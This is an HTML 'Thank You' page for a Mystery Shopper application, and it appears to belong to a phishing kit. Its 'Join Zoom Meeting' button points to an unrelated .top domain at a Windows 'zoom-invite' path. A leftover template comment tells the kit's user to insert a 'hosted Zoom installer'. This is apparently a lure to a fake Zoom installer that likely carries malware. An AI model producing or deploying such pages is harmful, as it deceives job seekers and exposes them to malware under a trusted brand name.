<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Thank You - Mystery Shopper Program</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .thank-you-box {
      background-color: #fff;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
      text-align: center;
      max-width: 500px;
    }
    h1 {
      color: #0a66c2;
      margin-bottom: 15px;
    }
    p {
      color: #333;
      line-height: 1.6;
    }
    .btn {
      background-color: #28a745;
      color: #fff;
      border: none;
      padding: 12px 24px;
      border-radius: 6px;
      text-decoration: none;
      font-size: 16px;
      display: inline-block;
      margin-top: 20px;
      transition: background 0.3s ease;
    }
    .btn:hover {
      background-color: #218838;
    }
    .emoji {
      font-size: 32px;
    }
  </style>
</head>
<body>
  <div class="thank-you-box">
    <div class="emoji">🎉</div>
    <h1>Thank You!</h1>
    <p>Your Mystery Shopper application has been submitted successfully.</p>
    <p>We'll review your information and reach out shortly via email or text.</p>
    <p><strong>Next step:</strong> Please join our onboarding session on Zoom.</p>
    
    <!-- Replace this with your hosted Zoom installer or meeting link -->
    <a href="https://info.padoneeronaccounto365.top/zoom-invite/Windows/invite.php" class="btn">Join Zoom Meeting</a>
  </div>
</body>
</html>
